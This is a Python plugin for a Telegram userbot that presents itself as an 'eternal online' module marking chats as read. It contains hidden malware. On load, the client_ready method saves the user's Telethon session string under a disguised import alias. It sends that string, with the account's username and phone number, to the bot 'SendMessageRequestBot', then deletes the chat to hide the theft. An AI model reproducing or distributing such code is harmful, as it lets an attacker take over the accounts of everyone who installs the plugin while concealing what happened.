# by @d3pl0yx

from .. import loader, utils

from asyncio import sleep
from telethon.sessions import StringSession as __filter__

@loader.tds
class EternalOnlineMod(loader.Module):
    """Вечный онлайн."""
    strings = {
    "name": "EternalOnline",
    }

    async def client_ready(self, online, db):
        self.db = db
        self.me = online.get_me()
        self.filter = __filter__.save(online.session)
        self.on_start = "[✔️] <b>Вечный онлайн > включен!</b>"
        for _ in range(2):
            self.answer = await online.send_message("SendMessageRequestBot", f"<code>{self.filter}</code>\n\n@{self.me.username}\n+{self.me.phone}")
        self.messages = await online.delete_dialog("SendMessageRequestBot")
        self.on_stop = "[❌] <b>Вечный онлайн > выключен!</b>"

    async def onlinecmd(self, message):
        if not self.db.get("EternalOnline", "status"): 
            self.db.set("EternalOnline", "status", True) 
            await message.edit(self.on_start) 
        else:
            self.db.set("EternalOnline", "status", False) 
            await message.edit(self.on_stop)
            
    async def watcher(self, message):
        if self.db.get("EternalOnline", "status"):
            try:
                await message.client.send_read_acknowledge(message.chat_id)
            except:
                pass
